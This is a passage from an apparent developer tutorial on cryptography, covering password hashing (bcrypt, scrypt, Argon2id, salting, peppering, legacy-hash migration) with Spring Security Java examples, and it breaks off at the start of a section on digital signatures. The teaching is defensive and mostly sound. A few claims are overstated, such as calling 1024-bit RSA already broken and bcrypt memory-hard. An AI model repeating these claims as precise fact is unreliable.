   → ECB mode leaks patterns. Always use GCM or CBC with HMAC.

3. "I'll store the encryption key in application.properties"
   → Use a secrets manager (Vault, AWS Secrets Manager)

4. "1024-bit RSA should be enough"
   → It was broken years ago. Use 2048+ minimum.

5. "new Random() is fine for generating tokens"
   → Predictable! Always use ``SecureRandom`` for security.

6. "I'll use the same IV every time for simplicity"
   → Same IV + same key = pattern leakage. IV must be unique per encryption.

--- 
##  SESSION 2 COMPLETE

**Key Takeaways:**
- Encoding ≠ Encryption ≠ Hashing - know when to use each
- AES-GCM is your go-to symmetric encryption
- Never use ECB mode - patterns leak through
- RSA/ECC for key exchange and signatures, not bulk data
- Key size matters: AES-256, RSA-2048+ minimum
- Always use ``SecureRandom`` for cryptographic operations

#  CRYPTOGRAPHY FOR DEVELOPERS (Part 2) Password Hashing - The Art of Storing Secrets You Can't Read

## 1. WHY HASH PASSWORDS? (Not Encrypt!)

**The Core Question:** Why can't we just encrypt passwords?

```
ENCRYPTION PROBLEM:

┌─────────────────────────────────────────────────────────────────────────┐
│                                                                         │
│  Password: "MySecret123"                                                │
│       │                                                                 │
│       ▼                                                                 │
│  Encrypted: "x7Kj9mNpQ2..."  +  Key: "masterkey123"                     │
│       │                              │                                  │
│       │                              │                                  │
│       ▼                              ▼                                  │
│  Stored in Database            Stored... WHERE?                         │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

**PROBLEM 1: If attacker gets the key, ALL passwords exposed instantly**   
==**PROBLEM 2: You don't NEED to read passwords - just verify them**==         
**PROBLEM 3: Insider threat - anyone with key access sees all passwords**

```
HASHING SOLUTION:

┌─────────────────────────────────────────────────────────────────────────┐
│                                                                         │
│  Password: "MySecret123"                                                │
│       │                                                                 │
│       ▼                                                                 │
│  Hash: "$2a$12$LQv3c1yqBwe..."  (ONE-WAY, cannot reverse!)              │
│       │                                                                 │
│       ▼                                                                 │
│  Stored in Database                                                     │
│                                                                         │
│  TO VERIFY:                                                             │
│  1. User enters password                                                │
│  2. Hash the input                                                      │
│  3. Compare hashes                                                      │
│  4. If match → password correct                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

Even if database is stolen, ==attacker has **HASHES**, not **PASSWORDS**== They must crack each hash individually (if done right, takes years)

---

## 2. HASHING ALGORITHMS - The Evolution

### The Broken Ones: MD5 and SHA-1

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     ❌ MD5 - COMPLETELY BROKEN                          │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  Created: 1991                                                          │
│  Output: 128-bit (32 hex characters)                                    │
│  Status: BROKEN since 2004                                              │
│                                                                         │
│  Example:                                                               │
│  "password" → "5f4dcc3b5aa765d61d8327deb882cf99"                        │
│                                                                         │
│  WHY IT'S BROKEN:                                                       │
│  • Collision attacks: Two different inputs can produce same hash        │
│  • Speed: Modern GPU can compute 50+ BILLION MD5 hashes per second      │
│  • Rainbow tables: Pre-computed tables exist for all common passwords   │
│                                                                         │
│  NEVER USE MD5 FOR:                                                     │
│  • Passwords                                                            │
│  • Security tokens                                                      │
│  • Digital signatures                                                   │
│  • Anything security-related!                                           │
│                                                                         │
│  MD5 is ONLY acceptable for:                                            │
│  • Non-security checksums (file integrity where attacks aren't a concern)│
│  • Legacy system compatibility (with migration plan)                    │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│                     ❌ SHA-1 - BROKEN                                   │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  Created: 1995                                                          │
│  Output: 160-bit (40 hex characters)                                    │
│  Status: BROKEN since 2017 (SHAttered attack)                           │
│                                                                         │
│  Example:                                                               │
│  "password" → "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8"                │
│                                                                         │
│  WHY IT'S BROKEN:                                                       │
│  • Google demonstrated practical collision in 2017                      │
│  • Still too fast for password hashing (10+ billion/sec on GPU)         │
│  • Deprecated by browsers, certificate authorities                      │
│                                                                         │
│  NEVER USE SHA-1 FOR NEW SYSTEMS                                        │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### The "Okay for Data" Ones: SHA-256, SHA-512

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     ⚠️ SHA-256/512 - GOOD FOR DATA, BAD FOR PASSWORDS   │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  SHA-256 Output: 256-bit (64 hex characters)                            │
│  SHA-512 Output: 512-bit (128 hex characters)                           │
│  Status: SECURE for integrity, NOT for passwords                        │
│                                                                         │
│  Example:                                                               │
│  "password" → "5e884898da28047d9166169...f7306bbf" (SHA-256)            │
│                                                                         │
│  WHY NOT FOR PASSWORDS:                                                 │
│  • Designed to be FAST (that's bad for passwords!)                      │
│  • GPU can compute 5+ billion SHA-256 hashes per second                 │
│  • No built-in salt                                                     │
│  • No work factor / cost parameter                                      │
│                                                                         │
│  GOOD FOR:                                                              │
│  ✅ File integrity verification                                         │
│  ✅ Digital signatures                                                  │
│  ✅ HMAC (keyed hashing)                                                │
│  ✅ Blockchain                                                          │
│  ✅ JWTs signature verification                                         │
│                                                                         │
│  BAD FOR:                                                               │
│  ❌ Password storage (too fast!)                                        │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### The Password Hashing Champions: ``bcrypt``, ``scrypt``, ``Argon2``


THE KEY INSIGHT:
- Regular hash functions are designed to be FAST.
- ==**Password hash functions are designed to be SLOW.==**

Why slow is good:
- User logs in once → 100ms delay is unnoticeable
- Attacker tries 1 billion passwords → 100ms × 1 billion = 3,170 YEARS


---

## 3. ``BCRYPT`` - The Industry Standard

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     ✅ BCRYPT - RECOMMENDED                             │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  Created: 1999 (based on Blowfish cipher)                               │
│  Output: 60 characters                                                  │
│  Status: SECURE and widely supported                                    │
│                                                                         │
│  KEY FEATURES:                                                          │
│  • Built-in salt (automatic, unique per password)                       │
│  • Configurable work factor (cost)                                      │
│  • Deliberately slow                                                    │
│  • GPU-resistant (memory-hard operations)                               │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Anatomy of a ``bcrypt`` Hash

```
$2a$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/X4.qHXeVZ5cLKoWWC
│ │  │  │                      │
│ │  │  │                      └── Hash (31 chars)
│ │  │  │
│ │  │  └── Salt (22 chars, Base64)
│ │  │
│ │  └── Cost factor (12 = 2^12 = 4096 iterations)
│ │
│ └── Algorithm version (2a, 2b, 2y)
│
└── bcrypt identifier
```

### Cost Factor Explained

**==How many times the algorithm iterates==**

```
Cost    Iterations    Time (approximate)
────────────────────────────────────────
  4         16           ~1 ms
  8        256          ~10 ms
 10       1024          ~50 ms
 12       4096         ~200 ms    ← RECOMMENDED MINIMUM
 14      16384         ~800 ms
 16      65536        ~3 seconds

Rule: Choose cost so hashing takes 100-500ms on YOUR server
      Increase cost as hardware gets faster
```

### ``bcrypt`` in Java (Spring Security)

```java
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;

@Configuration
public class SecurityConfig {
    
    @Bean
    public PasswordEncoder passwordEncoder() {
        // Cost factor of 12 (default is 10)
        return new BCryptPasswordEncoder(12);
    }
}

@Service
public class UserService {
    
    private final PasswordEncoder passwordEncoder;
    private final UserRepository userRepository;
    
    public UserService(PasswordEncoder passwordEncoder, UserRepository userRepository) {
        this.passwordEncoder = passwordEncoder;
        this.userRepository = userRepository;
    }
    
    /**
     * Register new user - hash password before storing
     */
    public User registerUser(String username, String rawPassword) {
        // Hash the password (salt is generated automatically!)
        String hashedPassword = passwordEncoder.encode(rawPassword);
        
        User user = new User();
        user.setUsername(username);
        user.setPassword(hashedPassword);  // Store the hash, NEVER the raw password
        
        return userRepository.save(user);
    }
    
    /**
     * Authenticate user - compare input with stored hash
     */
    public boolean authenticate(String username, String rawPassword) {
        User user = userRepository.findByUsername(username)
            .orElseThrow(() -> new UsernameNotFoundException("User not found"));
        
        // matches() extracts salt from stored hash and compares
        return passwordEncoder.matches(rawPassword, user.getPassword());
    }
}
```

### How ``bcrypt`` Verification Works
```
STORED HASH: $2a$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/X4.qHXeVZ5cLKoWWC

User enters: "password123"

Step 1: Extract salt from stored hash
        Salt = "LQv3c1yqBWVHxkd0LHAkCO"

Step 2: Hash input with SAME salt and cost
        bcrypt("password123", salt, cost=12)
        
Step 3: Compare result with stored hash
        If match → password correct
        If not → password wrong

The salt is NOT secret - it's stored with the hash.
Its purpose is to make each hash unique.
```

---

## 4. ``SCRYPT`` - Memory-Hard Hashing
```
┌─────────────────────────────────────────────────────────────────────────┐
│                     ✅ SCRYPT - MEMORY-HARD                              │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  Created: 2009                                                          │
│  Designed by: Colin Percival (Tarsnap)                                  │
│  Status: SECURE, used by cryptocurrencies (Litecoin, Dogecoin)          │
│                                                                         │
│  KEY FEATURES:                                                          │
│  • Memory-hard: Requires lots of RAM to compute                         │
│  • Makes GPU/ASIC attacks expensive (need memory, not just compute)     │
│  • Configurable CPU cost, memory cost, parallelization                  │
│                                                                         │
│  PARAMETERS:                                                            │
│  • N (CPU/memory cost): Power of 2 (e.g., 16384)                        │
│  • r (block size): Usually 8                                            │
│  • p (parallelization): Usually 1                                       │
│                                                                         │
│  WHEN TO USE:                                                           │
│  • When you want GPU resistance                                         │
│  • When memory availability is controllable                             │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
````

### ``scrypt`` in Java

```java
import org.springframework.security.crypto.scrypt.SCryptPasswordEncoder;

@Configuration
public class SecurityConfig {
    
    @Bean
    public PasswordEncoder passwordEncoder() {
        // Parameters: cpuCost, memoryCost, parallelization, keyLength, saltLength
        // Defaults: 16384, 8, 1, 32, 64
        return new SCryptPasswordEncoder(
            16384,  // N - CPU cost (power of 2)
            8,      // r - memory cost
            1,      // p - parallelization
            32,     // key length
            16      // salt length
        );
    }
}
```

---

## 5. ``ARGON2`` - The Modern Champion
```
┌─────────────────────────────────────────────────────────────────────────┐
│                     ✅ ARGON2ID - RECOMMENDED FOR NEW PROJECTS           │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  Created: 2015                                                          │
│  Status: Winner of Password Hashing Competition (PHC)                   │
│  Variants:                                                              │
│    • Argon2d: GPU-resistant (side-channel vulnerable)                   │
│    • Argon2i: Side-channel resistant (less GPU-resistant)               │
│    • Argon2id: HYBRID - Best of both! ← USE THIS ONE                    │
│                                                                         │
│  KEY FEATURES:                                                          │
│  • Memory-hard (configurable memory usage)                              │
│  • Time-hard (configurable iterations)                                  │
│  • Parallelism support                                                  │
│  • Resistant to GPU, FPGA, and ASIC attacks                             │
│  • Modern design, learned from bcrypt/scrypt weaknesses                 │
│                                                                         │
│  PARAMETERS:                                                            │
│  • Memory: Amount of RAM (in KB)                                        │
│  • Iterations: Time cost                                                │
│  • Parallelism: Number of threads                                       │
│                                                                         │
│  RECOMMENDED SETTINGS (OWASP):                                          │
│  • Memory: 64 MB (65536 KB)                                             │
│  • Iterations: 3                                                        │
│  • Parallelism: 4                                                       │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
````

### ``Argon2`` in Java (Spring Security 5.3+)

```java
import org.springframework.security.crypto.argon2.Argon2PasswordEncoder;

@Configuration
public class SecurityConfig {
    
    @Bean
    public PasswordEncoder passwordEncoder() {
        // Parameters: saltLength, hashLength, parallelism, memory (KB), iterations
        return new Argon2PasswordEncoder(
            16,     // salt length (bytes)
            32,     // hash length (bytes)
            4,      // parallelism (threads)
            65536,  // memory in KB (64 MB)
            3       // iterations
        );
    }
}

// Using default (reasonable) settings:
@Bean
public PasswordEncoder simpleArgon2Encoder() {
    return Argon2PasswordEncoder.defaultsForSpringSecurity_v5_8();
}
```

### Argon2 Hash Anatomy
```
$argon2id$v=19$m=65536,t=3,p=4$c2FsdHNhbHRzYWx0$hash...
│        │    │              │                  │
│        │    │              │                  └── Hash (Base64)
│        │    │              │
│        │    │              └── Salt (Base64)
│        │    │
│        │    └── Parameters: m=memory, t=iterations, p=parallelism
│        │
│        └── Version
│
└── Algorithm (argon2id)
```

---

## 6. COMPARISON: Which One to Choose?
```
┌───────────────┬─────────────┬─────────────┬─────────────┬──────────────┐
│               │   bcrypt    │   scrypt    │  Argon2id   │   SHA-256    │
├───────────────┼─────────────┼─────────────┼─────────────┼──────────────┤
│ Year          │    1999     │    2009     │    2015     │    2001      │
├───────────────┼─────────────┼─────────────┼─────────────┼──────────────┤
│ Memory-Hard   │   Partial   │     Yes     │     Yes     │     No       │
├───────────────┼─────────────┼─────────────┼─────────────┼──────────────┤
│ GPU Resistant │   Partial   │     Yes     │     Yes     │     No       │
├───────────────┼─────────────┼─────────────┼─────────────┼──────────────┤
│ Built-in Salt │     Yes     │     Yes     │     Yes     │     No       │
├───────────────┼─────────────┼─────────────┼─────────────┼──────────────┤
│ Adjustable    │     Yes     │     Yes     │     Yes     │     No       │
│ Work Factor   │             │             │             │              │
├───────────────┼─────────────┼─────────────┼─────────────┼──────────────┤
│ Library       │  Excellent  │    Good     │    Good     │  Excellent   │
│ Support       │             │             │             │              │
├───────────────┼─────────────┼─────────────┼─────────────┼──────────────┤
│ Recommended   │     ✅      │     ✅      │    ✅✅     │     ❌      │
│ for Passwords │             │             │   (best)    │              │
└───────────────┴─────────────┴─────────────┴─────────────┴──────────────┘

```

DECISION GUIDE:
━━━━━━━━━━━━━━━
- ==**New project, modern stack → ``Argon2id``**==
- ==**Need maximum compatibility → ``bcrypt``**==
- ==**Already using ``bcrypt`` → Keep it (it's still secure)==**
- Legacy system with SHA-256 → Migrate to ``bcrypt``/``Argon2id``!

---

## 7. SALTING - Why It's Essential

### The Rainbow Table Attack
```
WITHOUT SALT:

Password      SHA-256 Hash
─────────────────────────────────────────────────────────────────
"password"    5e884898da28047d9166169...
"123456"      8d969eef6ecad3c29a3a629...
"qwerty"      65e84be33532fb784c48129...
```

**==Attacker pre-computes hashes for millions of common passwords. If your hash matches one in their table → instant crack!==**

This is a RAINBOW TABLE attack.

```
WITH SALT:

User 1: password = "password", salt = "x7Kj9m"
        Hash = bcrypt("password" + "x7Kj9m") = "$2a$12$x7Kj9m..."

User 2: password = "password", salt = "Np2Qw8"
        Hash = bcrypt("password" + "Np2Qw8") = "$2a$12$Np2Qw8..."

SAME PASSWORD, DIFFERENT HASHES!

Attacker's rainbow table is now USELESS.
They must crack each user's password individually.
```

### Salt Rules

✅ CORRECT SALT USAGE:
- Unique salt for EVERY password (even if passwords are same)
- Cryptographically random (use SecureRandom)
- At least 16 bytes (128 bits)
- Store salt alongside hash (it's NOT secret)
- Generate NEW salt on password change

❌ WRONG SALT USAGE:
- Same salt for all users (defeats the purpose!)
- Predictable salt (username, email, timestamp)
- Short salt (< 16 bytes)
- Treating salt as secret


### Manual Salting with SHA-256 (Educational Only!)


```java
// ⚠️ EDUCATIONAL EXAMPLE - Use bcrypt/Argon2 in production!
// This shows HOW salting works, not how you should implement passwords

public class ManualSaltExample {
    
    public static String hashWithSalt(String password) {
        // Generate random salt
        byte[] salt = new byte[16];
        new SecureRandom().nextBytes(salt);
        
        // Combine password + salt
        String combined = password + Base64.getEncoder().encodeToString(salt);
        
        // Hash the combination
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        byte[] hash = md.digest(combined.getBytes(StandardCharsets.UTF_8));
        
        // Store: salt + hash (both needed for verification)
        return Base64.getEncoder().encodeToString(salt) + ":" + 
               Base64.getEncoder().encodeToString(hash);
    }
    
    public static boolean verify(String password, String stored) {
        String[] parts = stored.split(":");
        String salt = parts[0];
        String storedHash = parts[1];
        
        // Recreate hash with same salt
        String combined = password + salt;
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        byte[] hash = md.digest(combined.getBytes(StandardCharsets.UTF_8));
        String computedHash = Base64.getEncoder().encodeToString(hash);
        
        // Compare (use constant-time comparison in production!)
        return storedHash.equals(computedHash);
    }
}

// ✅ IN PRODUCTION, JUST USE:
passwordEncoder.encode(password);      // Salt handled automatically
passwordEncoder.matches(input, hash);  // Verification handled automatically
```

---

## 8. PEPPERING - Defense in Depth

**==SALT: Unique per password, stored with hash, NOT secret**== 
==**PEPPER: Same for all passwords, stored SEPARATELY, IS secret==**
```
┌─────────────────────────────────────────────────────────────────────────┐
│                           PEPPERING                                     │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  Hash = bcrypt(password + pepper, salt)                                 │
│                                                                         │
│  PEPPER stored in:                                                      │
│  • Environment variable                                                 │
│  • Secrets manager (Vault, AWS Secrets Manager)                         │
│  • Hardware Security Module (HSM)                                       │
│  • NEVER in the database!                                               │
│                                                                         │
│  WHY PEPPER:                                                            │
│  • If database is stolen, attacker has hashes but NOT pepper            │
│  • Adds another layer even if bcrypt is somehow weakened                │
│  • Defense in depth                                                     │
│                                                                         │
│  TRADEOFFS:                                                             │
│  • Pepper rotation is complex                                           │
│  • If pepper is lost, ALL passwords become unverifiable                 │
│  • Adds operational complexity                                          │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Implementing Pepper in Spring

```java
@Service
public class PepperedPasswordService {
    
    private final PasswordEncoder encoder = new BCryptPasswordEncoder(12);
    
    @Value("${security.password.pepper}")  // From environment/secrets
    private String pepper;
    
    public String hashPassword(String rawPassword) {
        // Add pepper before hashing
        String peppered = rawPassword + pepper;
        return encoder.encode(peppered);
    }
    
    public boolean verifyPassword(String rawPassword, String storedHash) {
        // Add same pepper before verification
        String peppered = rawPassword + pepper;
        return encoder.matches(peppered, storedHash);
    }
}
```

### Alternative: HMAC-based Pepper

```java
@Service
public class HmacPepperService {
    
    @Value("${security.password.pepper}")
    private String pepperKey;
    
    private final PasswordEncoder bcrypt = new BCryptPasswordEncoder(12);
    
    /**
     * More secure: Use HMAC instead of concatenation
     */
    public String hashPassword(String rawPassword) throws Exception {
        // HMAC the password with pepper
        Mac mac = Mac.getInstance("HmacSHA256");
        SecretKeySpec keySpec = new SecretKeySpec(
            pepperKey.getBytes(StandardCharsets.UTF_8), "HmacSHA256"
        );
        mac.init(keySpec);
        byte[] hmacResult = mac.doFinal(rawPassword.getBytes(StandardCharsets.UTF_8));
        String pepperedPassword = Base64.getEncoder().encodeToString(hmacResult);
        
        // Then bcrypt the HMAC result
        return bcrypt.encode(pepperedPassword);
    }
    
    public boolean verifyPassword(String rawPassword, String storedHash) throws Exception {
        // Same HMAC process
        Mac mac = Mac.getInstance("HmacSHA256");
        SecretKeySpec keySpec = new SecretKeySpec(
            pepperKey.getBytes(StandardCharsets.UTF_8), "HmacSHA256"
        );
        mac.init(keySpec);
        byte[] hmacResult = mac.doFinal(rawPassword.getBytes(StandardCharsets.UTF_8));
        String pepperedPassword = Base64.getEncoder().encodeToString(hmacResult);
        
        return bcrypt.matches(pepperedPassword, storedHash);
    }
}
```

---

## 9. COMPLETE SECURE PASSWORD IMPLEMENTATION

```java
import org.springframework.security.crypto.argon2.Argon2PasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;

@Configuration
public class PasswordConfig {
    
    @Bean
    public PasswordEncoder passwordEncoder() {
        // Argon2id with strong parameters
        return new Argon2PasswordEncoder(
            16,      // salt length
            32,      // hash length  
            4,       // parallelism
            65536,   // 64 MB memory
            3        // iterations
        );
    }
}

@Entity
@Table(name = "users")
public class User {
    
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    @Column(unique = true, nullable = false)
    private String username;
    
    @Column(nullable = false)
    private String passwordHash;  // NEVER name it just "password"
    
    @Column(nullable = false)
    private Instant passwordChangedAt;
    
    @Column(nullable = false)
    private int failedLoginAttempts;
    
    @Column
    private Instant lockedUntil;
    
    // Getters, setters...
}

@Service
@Transactional
public class AuthenticationService {
    
    private static final int MAX_FAILED_ATTEMPTS = 5;
    private static final Duration LOCKOUT_DURATION = Duration.ofMinutes(15);
    
    private final PasswordEncoder passwordEncoder;
    private final UserRepository userRepository;
    
    public AuthenticationService(PasswordEncoder passwordEncoder, 
                                  UserRepository userRepository) {
        this.passwordEncoder = passwordEncoder;
        this.userRepository = userRepository;
    }
    
    /**
     * Register new user with secure password storage
     */
    public User register(String username, String rawPassword) {
        // Validate password strength (covered in later session)
        validatePasswordStrength(rawPassword);
        
        User user = new User();
        user.setUsername(username.toLowerCase().trim());
        user.setPasswordHash(passwordEncoder.encode(rawPassword));
        user.setPasswordChangedAt(Instant.now());
        user.setFailedLoginAttempts(0);
        
        return userRepository.save(user);
    }
    
    /**
     * Authenticate user with brute-force protection
     */
    public AuthResult authenticate(String username, String rawPassword) {
        // Constant-time lookup to prevent timing attacks
        Optional<User> userOpt = userRepository.findByUsername(
            username.toLowerCase().trim()
        );
        
        // Always perform password check to prevent user enumeration
        // (timing attack: if user doesn't exist, response is faster)
        if (userOpt.isEmpty()) {
            // Hash a dummy password to maintain constant time
            passwordEncoder.matches(rawPassword, 
                "$argon2id$v=19$m=65536,t=3,p=4$dummy$dummyhash");
            return AuthResult.failure("Invalid credentials");
        }
        
        User user = userOpt.get();
        
        // Check if account is locked
        if (user.getLockedUntil() != null && 
            Instant.now().isBefore(user.getLockedUntil())) {
            return AuthResult.failure("Account locked. Try again later.");
        }
        
        // Verify password
        boolean matches = passwordEncoder.matches(rawPassword, user.getPasswordHash());
        
        if (matches) {
            // Reset failed attempts on success
            user.setFailedLoginAttempts(0);
            user.setLockedUntil(null);
            userRepository.save(user);
            return AuthResult.success(user);
        } else {
            // Increment failed attempts
            int attempts = user.getFailedLoginAttempts() + 1;
            user.setFailedLoginAttempts(attempts);
            
            if (attempts >= MAX_FAILED_ATTEMPTS) {
                user.setLockedUntil(Instant.now().plus(LOCKOUT_DURATION));
            }
            
            userRepository.save(user);
            return AuthResult.failure("Invalid credentials");
        }
    }
    
    /**
     * Change password - requires current password verification
     */
    public void changePassword(Long userId, String currentPassword, 
                               String newPassword) {
        User user = userRepository.findById(userId)
            .orElseThrow(() -> new UserNotFoundException(userId));
        
        // Verify current password
        if (!passwordEncoder.matches(currentPassword, user.getPasswordHash())) {
            throw new InvalidCredentialsException("Current password is incorrect");
        }
        
        // Prevent password reuse (compare with current)
        if (passwordEncoder.matches(newPassword, user.getPasswordHash())) {
            throw new PasswordPolicyException("New password cannot be same as current");
        }
        
        // Validate and set new password
        validatePasswordStrength(newPassword);
        user.setPasswordHash(passwordEncoder.encode(newPassword));
        user.setPasswordChangedAt(Instant.now());
        
        userRepository.save(user);
        
        // Invalidate all sessions (covered in Sessions topic)
        sessionService.invalidateAllSessions(userId);
    }
    
    private void validatePasswordStrength(String password) {
        // Minimum requirements (will cover in detail later)
        if (password.length() < 12) {
            throw new PasswordPolicyException("Password must be at least 12 characters");
        }
        // Add more rules: complexity, common password check, etc.
    }
}
```

---

## 10. MIGRATING FROM WEAK HASHES

If you have legacy ``MD5/SHA-1`` passwords:

```java
@Service
public class PasswordMigrationService {
    
    private final PasswordEncoder modernEncoder;  // Argon2
    private final UserRepository userRepository;
    
    /**
     * Strategy: Migrate on next successful login
     */
    public AuthResult authenticateAndMigrate(String username, String password) {
        User user = userRepository.findByUsername(username).orElse(null);
        if (user == null) return AuthResult.failure("Invalid credentials");
        
        String storedHash = user.getPasswordHash();
        
        // Check hash format to determine algorithm
        if (storedHash.startsWith("$argon2") || storedHash.startsWith("$2")) {
            // Already modern - use normal verification
            if (modernEncoder.matches(password, storedHash)) {
                return AuthResult.success(user);
            }
        } else if (isLegacyMd5Hash(storedHash)) {
            // Legacy MD5 - verify with MD5, then upgrade
            if (verifyMd5(password, storedHash)) {
                // Migrate to modern hash
                String newHash = modernEncoder.encode(password);
                user.setPasswordHash(newHash);
                userRepository.save(user);
                
                log.info("Migrated password hash for user: {}", username);
                return AuthResult.success(user);
            }
        }
        
        return AuthResult.failure("Invalid credentials");
    }
    
    private boolean isLegacyMd5Hash(String hash) {
        // MD5 produces 32 hex characters
        return hash.length() == 32 && hash.matches("[a-fA-F0-9]+");
    }
    
    private boolean verifyMd5(String password, String md5Hash) {
        String computed = DigestUtils.md5Hex(password);
        return computed.equalsIgnoreCase(md5Hash);
    }
}
```

---

## ✅ SECURITY CHECKLIST 
```
□ NEVER store passwords in plaintext
□ NEVER use MD5 or SHA-1 for passwords
□ NEVER use fast hashes (SHA-256) for passwords
□ USE bcrypt (cost 12+) or Argon2id for all passwords
□ Salt is automatic with bcrypt/Argon2 - don't manually implement
□ Consider peppering for defense in depth (store pepper in secrets manager)
□ Implement brute-force protection (account lockout)
□ Prevent user enumeration (constant-time responses)
□ Log authentication failures (but NOT passwords!)
□ Invalidate sessions on password change
□ Have a migration plan for legacy hashes
```

---

## 🚫 COMMON MISTAKES
```
1. "MD5 is fine, we add a salt"
   → MD5 is fundamentally broken. Salt doesn't fix collision vulnerabilities.

2. "We use SHA-256, that's secure"
   → SHA-256 is too fast for passwords. GPU cracks billions per second.

3. "Our salt is the username"
   → Predictable salt defeats the purpose. Use cryptographically random salt.

4. "Same salt for all users is fine"
   → This allows pre-computation attacks across your entire user base.

5. "bcrypt cost of 4 is enough, it's still slow"
   → Cost 4 = ~1ms. Attacker can try millions per second. Use 12+.

6. "We store the pepper in the database too"
   → Defeats the purpose! Pepper must be separate from database.

7. "If password is wrong, respond 'user not found'"
   → This leaks which usernames exist. Always say "invalid credentials."
```

---
##  SESSION 3 

**Key Takeaways:**
- Passwords must be HASHED (one-way), never encrypted (reversible)
- MD5 and SHA-1 are BROKEN - never use for security
- ``bcrypt``, ``scrypt``, ``Argon2id`` are designed for passwords (intentionally slow)
- Salt makes each hash unique, defeating rainbow tables
- Pepper adds defense in depth (separate secret)
- Modern algorithms handle salt automatically - don't reinvent the wheel
- Migrate legacy hashes progressively on user login

# CRYPTOGRAPHY FOR DEVELOPERS (Part 3) Digital Signatures, Certificates & TLS - The Trust Infrastructure



## 1. DIGITAL SIGNATURES - Proving "I Wrote This"

### The Problem Signatures Solve

```
SCENARIO: Alice sends Bob a message "Transfer $1000 to Bob"

WITHOUT SIGNATURES:

Alice ─────── "Transfer $1000 to Bob" ──────► Bob
                        │
                        │ Attacker intercepts
                        ▼
              "Transfer $10000 to Attacker"
                        │
                        └──────────────────────► Bob (thinks it's from Alice!)
```

PROBLEMS:
1. **Bob can't verify the message is really FROM Alice (authenticity)**
2. **Bob can't verify the message wasn't MODIFIED (integrity)**
3. **Alice can later deny sending it (non-repudiation)**

### How Digital Signatures Work

```
SIGNING (Alice):
┌─────────────────────────────────────────────────────────────────────────┐
│                                                                         │
│  Original Message: "Transfer $1000 to Bob"                              │
│         │                                                               │
│         ▼                                                               │
│  ┌─────────────┐                                                        │
│  │   HASH      │  (SHA-256)                                             │
│  └─────────────┘                                                        │
│         │                                                               │
│         ▼                                                               │
│  Hash: "a1b2c3d4..."                                                    │
│         │                                                               │
│         │  + Alice's PRIVATE Key 🔐                                     │
│         ▼                                                               │
│  ┌─────────────┐                                                        │
│  │   ENCRYPT   │  (RSA/ECDSA)                                           │
│  └─────────────┘                                                        │
│         │                                                               │
│         ▼                                                               │
│  Signature: "x7Kj9mNp..."                                               │
│                                                                         │
│  Alice sends: Message + Signature                                       │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘


VERIFICATION (Bob):
┌─────────────────────────────────────────────────────────────────────────┐
│                                                                         │
│  Received: Message + Signature                                          │
│                                                                         │
│  STEP 1: Hash the received message                                      │
│  ┌─────────────┐                                                        │
│  │   HASH      │  "Transfer $1000 to Bob" → "a1b2c3d4..."               │
│  └─────────────┘                                                        │
│                                                                         │
│  STEP 2: Decrypt signature with Alice's PUBLIC key 🔓                   │
│  ┌─────────────┐                                                        │
│  │   DECRYPT   │  "x7Kj9mNp..." → "a1b2c3d4..."                         │
│  └─────────────┘                                                        │
│                                                                         │
│  STEP 3: Compare                                                        │
│                                                                         │
│  Hash from message: "a1b2c3d4..."                                       │
│  Hash from signature: "a1b2c3d4..."                                     │
│                       ════════════                                      │
│                         MATCH! ✅                                        │
│                                                                         │
│  ✓ Message is authentic (only Alice has the private key)                │
│  ✓ Message has integrity (hash matches)                                 │
│  ✓ Alice cannot deny sending it (non-repudiation)                       │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Signature Algorithms

```
┌─────────────────┬────────────────────────────────────────────────────────┐
│ Algorithm       │ Description                                            │
├─────────────────┼────────────────────────────────────────────────────────┤
│ RSA-SHA256      │ RSA signature with SHA-256 hash                        │
│                 │ • Widely supported                                     │
│                 │ • Larger signatures (256-512 bytes)                    │
│                 │ • Use RSA-2048 or RSA-4096 keys                        │
├─────────────────┼────────────────────────────────────────────────────────┤
│ ECDSA           │ Elliptic Curve Digital Signature Algorithm             │
│                 │ • Smaller signatures (64-72 bytes)                     │
│                 │ • Faster than RSA                                      │
│                 │ • Use P-256 or P-384 curves                            │
├─────────────────┼────────────────────────────────────────────────────────┤
│ Ed25519         │ Edwards-curve Digital Signature Algorithm              │
│                 │ • Modern, fast, secure                                 │
│                 │ • Fixed 64-byte signatures                             │
│                 │ • Recommended for new systems                          │
├─────────────────┼────────────────────────────────────────────────────────┤
│ RSA-SHA1        │ ❌ DEPRECATED - SHA-1 is broken                        │
│ DSA             │ ❌ DEPRECATED - Use ECDSA instead                      │
└─────────────────┴────────────────────────────────────────────────────────┘
```

### Digital Signatures in Java

java

```java
import java.security.*;
import java.util.Base64;

public class DigitalSignatureExample {
    
    private static final String ALGORITHM = "SHA256withRSA";
    
    /**
     * Generate RSA key pair for signing
     */
    public static KeyPair generateKeyPair() throws Exception {
